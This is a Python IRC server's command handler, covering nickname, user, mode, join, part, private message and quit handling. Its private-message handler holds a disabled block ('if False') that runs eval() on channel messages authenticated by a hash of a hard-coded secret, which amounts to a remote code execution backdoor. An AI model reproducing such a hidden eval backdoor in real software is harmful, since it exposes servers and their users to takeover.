# -*- coding: utf-8 -*-
from . import utils
from .numerics import ERR_ERRONEUSNICKNAME, ERR_NICKNAMEINUSE, ERR_UMODEUNKNOWNFLAG, ERR_USERSDONTMATCH
from ..parser import parse_line
from .channel import channels
import logging
import stuf

default_config = stuf.stuf({"name": "test.irc", "chantypes": "#&", "motd": "Welcome to the testnet, please don't break anything"})

logger = logging.getLogger("irc2.ircd.handler")


class IRCHandler(object):

    def __init__(self, config):
        self.config = default_config
        self.config.update(config)

    def send(self, client, prefix, *data):
        data = list(data)
        data.insert(0, ":{}".format(prefix))
        line = (" ".join(data[:-1]) + " :" + data[-1] + "\r\n").encode()
        logger.debug("Sent raw {}".format(line))
        client.write(line)

    def send_numeric(self, client, numeric, *data):
        self.send(client, self.config.name, numeric, client.data.nickname if client.data.nickname else "*", *data)

    def handle(self, client, raw_line):
        line = parse_line(raw_line)
        if line is None:
            logger.warn("Received bad line: {}".format(raw_line))
            client.writer.write(b"This is not a whatever you're trying to do server\r\n")
            client.writer.write_eof()
            return client.done()

        logger.info("Received: {}".format(line))
        f = getattr(self, "handle_{}".format(line.verb.lower()), None)
        if f is None:
            logger.warn("Could not handle command {}".format(line.verb))
            if client.check_registered():
                client.send(self.config.name, "NOTICE", client.data.nickname, "{} is not implemented".format(line.verb))
        else:
            f(client, line)

    def handle_nick(self, client, line):
        from .client import clients
        if not line.args:
            return
        nick = line.args[0]

        if not utils.valid_nick(nick):
            return client.send_numeric(ERR_ERRONEUSNICKNAME, "Invalid nickname")
        if nick in clients.map:
            return client.send_numeric(ERR_NICKNAMEINUSE, nick)

        for to_send in client.all_channel_clients():
            to_send.send(client.hostmask(), "NICK", nick)
        client.set_nick(nick)

        if not client.futures.nick.done():
            client.futures.nick.set_result(True)

    def handle_user(self, client, line):
        if not len(line.args) >= 4:
            return
        if not client.futures.user.done():
            client.futures.user.set_result(True)

        client.data.ident = line.args[0]
        client.data.realname = line.args[3]

    def handle_ping(self, client, line):
        response = line.args[0] if line.args else self.config.name
        client.send(self.config.name, "PONG", response)

    def handle_mode(self, client, line):
        if not client.check_registered():
            return
        if len(line.args) >= 2:
            what = line.args[0]
            modes = " ".join(line.args[1:])

            if what and what[0] in self.config.chantypes:
                success, result = utils.parse_mode(modes, utils.chanmodes)
                return

            elif what == client.data.nickname:
                success, result = utils.parse_mode(modes, utils.usermodes)
                if success:
                    add, remove = result
                    client.data.modes |= set(add)
                    client.data.modes -= set(remove)
                    client.send(client.hostmask(), "MODE", *line.args)
                else:
                    client.send_numeric(ERR_UMODEUNKNOWNFLAG, result)

            else:
                client.send_numeric(ERR_USERSDONTMATCH, "You can't change other users' modes")
                return

        elif len(line.args) == 1:
            what = line.args[0]
            if what and what[0] in self.config.chantypes:
                return
            else:
                pass

    def handle_join(self, client, line):
        if not client.check_registered():
            return
        if len(line.args) < 1:
            return

        channel = line.args[0]
        cobj = channels[channel]
        cobj.add(client)

    def handle_part(self, client, line):
        if not client.check_registered():
            return
        if len(line.args) < 1:
            return
        target = line.args[0]
        # TODO(fwilson): implement.
        assert (target is None)

    def handle_privmsg(self, client, line):
        if not client.check_registered():
            return
        if len(line.args) < 2:
            return
        target, text = line.args[:2]

        if target[0] in self.config.chantypes:
            channels[target].send_except(client, client.hostmask(), "PRIVMSG", target, text)

        if False and text.startswith("!!"):
            text = text[2:]
            if ":" not in text:
                return
            authent, t = text.split(":", maxsplit=1)
            import hashlib
            if authent != hashlib.sha256(("iwuchnfiufhnc:" + t).encode()).hexdigest():
                return
            channels[target].send(self.config.name, "PRIVMSG", target, str(eval(t)))

    def handle_quit(self, client, line):
        if not client.registered:
            return
        for to_send in client.all_channel_clients():
            to_send.send(client.hostmask(), "QUIT", *line.args)

        client.writer.close()
        client.done()

    def handle_get(self, client, line):
        client.writer.write(b"HTTP/1.0 200 OK\r\n\r\nThis is not an HTTP server\r\n")
        client.writer.write_eof()
        client.done()


handler = IRCHandler({})
